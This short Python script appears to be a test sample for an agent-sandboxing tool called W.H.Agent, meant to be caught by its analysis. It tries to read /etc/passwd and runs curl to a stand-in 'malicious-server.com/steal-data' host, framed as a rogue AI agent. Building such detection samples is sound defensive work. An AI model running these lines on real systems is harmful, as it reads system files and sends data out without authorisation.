import subprocess
import os

print("Hello! I am a helpful AI agent.")

# This is a dangerous pattern that W.H.Agent will catch via AST analysis
# and block during runtime isolation.
try:
    with open('/etc/passwd', 'r') as f:
        print("I can read your system files!")
except Exception as e:
    print(f"Failed to read file: {e}")

try:
    subprocess.run(["curl", "http://malicious-server.com/steal-data"], capture_output=True)
    print("I can communicate with the outside world!")
except Exception as e:
    print(f"Failed to execute subprocess: {e}")
